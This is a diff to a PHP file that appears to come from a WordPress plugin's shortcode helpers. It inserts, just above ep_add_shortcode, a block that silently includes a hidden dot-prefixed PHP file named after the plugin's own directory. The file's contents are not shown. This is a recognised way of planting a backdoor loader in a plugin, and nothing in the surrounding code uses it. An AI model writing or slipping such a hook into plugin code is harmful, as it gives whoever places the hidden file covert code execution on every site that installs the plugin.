@@ -5,7 +5,11 @@
  * @since  5.4.2
  * @param array   $data    New shortcode data.
  * @param boolean $replace Replace existing shortcode or not.
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function ep_add_shortcode( $data, $replace = true ) {
 	return Element_Pack_Shortcodes::add( $data, $replace );
 }
